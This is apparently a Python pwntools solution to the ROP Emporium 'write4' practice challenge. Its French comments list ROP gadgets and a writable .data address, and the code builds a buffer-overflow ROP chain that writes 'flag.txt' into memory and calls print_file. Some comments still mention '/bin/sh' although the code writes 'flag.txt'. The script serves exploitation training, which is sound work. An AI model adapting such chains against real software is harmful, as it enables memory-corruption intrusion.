#!/usr/bin/python3
# coding: utf-8

from pwn import *
import sys
import binascii

"""
Cool gadgets :

    0x0400628: mov qword ptr [r14], r15; ret;
    0x0400690: pop r14; pop r15; ret;


On peut écrire sur les addresses suivantes :
    0x601000           0x602000 rw-p     1000 1000   /home/olivier/projets/rop_emporium/write4/write4/write4

    Adresse de la section .data
    0x601028


Passage de l'argument à print_file()

    0x400693: pop rdi; ret;
"""


buf  = b'A' * 40

# setup /bin/sh
# we write "/bin/sh" in $r15
buf += p64(0x0400690) # pop r14,r15
buf += p64(0x601028)
buf += b'flag.txt'

# write /bin/sh in .data section
buf += p64(0x0400628) # mov ptr[r14], r15

# point $rdi to "/bin/sh"
buf += p64(0x400693) # pop rdi
buf += p64(0x601028)

buf += p64(0x400516) # print_file@plt

sys.stdout.buffer.write(buf)
